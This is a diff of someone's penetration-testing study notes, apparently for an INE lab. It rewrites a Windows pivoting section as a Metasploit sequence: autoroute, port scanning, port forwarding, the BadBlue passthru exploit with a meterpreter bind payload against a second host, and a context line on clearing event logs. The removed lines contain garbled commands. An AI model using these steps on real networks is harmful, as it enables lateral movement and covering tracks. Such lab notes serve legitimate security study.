@@ -62,17 +62,21 @@ post/windows/gather/checkvm
 clearev // clears logs from meterpreter
 
 Pivoting WIndows -
-run autoroute -s ip 10.10.10.0shell/255.255.255.240.0 // use comprimised taget ip with network address and use correct subnet// use ipconfig to find subnet
-sessions -n victim-1 -i 1
-search portscan // use auxiliary/scanner/portscan/tcp 
-sessions -victim-1
-portfwd add -l 1234 -p 80 -r victim2ip
-db_nmap -sS -sV -p 1234 localhost
-use exploit
-set payload windows/meterpreter/bind_tcp
-set RHOSTS victim2ip
-set LPORT to new port
-run //should get new meterpreter sesssion on victim 2// rename session to victim2
+run autoroute -s 10.0.19.0/20
+background
+use auxiliary/scanner/portscan/tcp
+set RHOSTS demo2.ine.local
+set PORTS 1-100
+exploit
+sessions -i 1
+portfwd add -l 1234 -p 80 -r <IP Address of demo2.ine.local>
+portfwd list
+nmap -sV -sS -p 1234 localhost
+background
+use exploit/windows/http/badblue_passthru
+set PAYLOAD windows/meterpreter/bind_tcp
+set RHOSTS demo2.ine.local
+exploit
 
 
 WMAP -
